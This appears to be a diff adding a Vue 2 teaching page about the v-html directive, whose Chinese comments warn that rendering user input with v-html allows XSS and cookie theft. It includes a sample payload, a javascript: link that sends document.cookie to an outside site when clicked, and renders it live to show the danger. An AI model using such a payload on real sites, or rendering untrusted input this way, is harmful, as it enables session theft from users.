@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+  <meta http-equiv='X-UA-Compatible' content='ie=edge'>
+  <title>Document</title>
+</head>
+<body>
+  <!--
+    1、v-html会解析执行其中的代码，假如用户输入了危险的代码，就有可能导致xss攻击
+    2、有HttpOnly属性的cookie只能被http协议读取和携带，但是没有HttpOnly属性的cookie，就可以被读取到，导致cookie泄漏
+    3、v-html一定要用在可信的内容上，永远不要相信用户的输入
+  -->
+  <div id='app'>
+    <div v-html="msg"></div>
+    <div v-html="dangerStr"></div>
+  </div>
+</body>
+<script src='https://cdn.bootcdn.net/ajax/libs/vue/2.6.14/vue.min.js'></script>
+<script>
+  const vm = new Vue({
+    el: '#app',
+    data: {
+      msg: "<h1>v-html可以解析HTML</h1>",
+      dangerStr: `<a href="javascript:location.href='http://www.baidu.com?' + document.cookie" >点击我</a>`,
+    },
+    methods: {},
+  });
+</script>
+</html>
